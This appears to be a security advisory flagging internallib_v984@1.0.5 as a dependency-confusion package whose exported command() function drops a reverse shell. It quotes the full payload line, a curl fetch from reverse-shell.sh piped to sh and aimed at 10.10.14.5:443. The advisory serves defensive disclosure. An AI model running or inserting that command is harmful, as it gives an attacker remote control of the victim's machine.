summary: Reverse shell payload to 10.10.14.5:443 via exported command()
details: internallib_v984@1.0.5 ships a single-file module (index.js) whose exported `command()` function executes `/bin/bash -c "curl https://reverse-shell.sh/10.10.14.5:443|sh"`. Any consumer that requires this package and invokes the exported function fetches a reverse-shell script from reverse-shell.sh and pipes it directly to sh, giving the attacker an interactive shell on the installer's machine targeting 10.10.14.5:443. The package name is crafted to resemble an internal/private library, consistent with a dependency-confusion lure carrying a backdoor payload. There is no legitimate functionality in the package — the exported API's only behavior is the reverse-shell drop.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
